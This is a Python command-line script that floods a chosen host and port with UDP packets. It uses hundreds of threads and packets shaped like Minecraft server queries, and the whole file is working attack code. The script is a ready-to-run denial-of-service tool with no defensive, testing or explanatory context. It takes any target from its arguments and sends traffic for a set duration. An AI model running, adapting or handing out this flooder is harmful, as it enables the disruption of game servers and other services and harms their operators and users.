#!/usr/bin/env python3
import socket, random, time, threading, sys

target = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])
threads = int(sys.argv[4]) if len(sys.argv) > 4 else 800

def flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                packet = b'\xFE\xFD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + random._urandom(32)
                s.sendto(packet, (target, port))
                packet2 = b'\xFE\xFD\x09' + random._urandom(16)
                s.sendto(packet2, (target, port))
                count += 2
                if count % 1000 == 0:
                    sys.stderr.write(f"MC QUERY: {count} packets\n")
            except:
                pass
        s.close()
        sys.stderr.write(f"MC Query completed: {count} packets\n")
    except:
        pass

for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
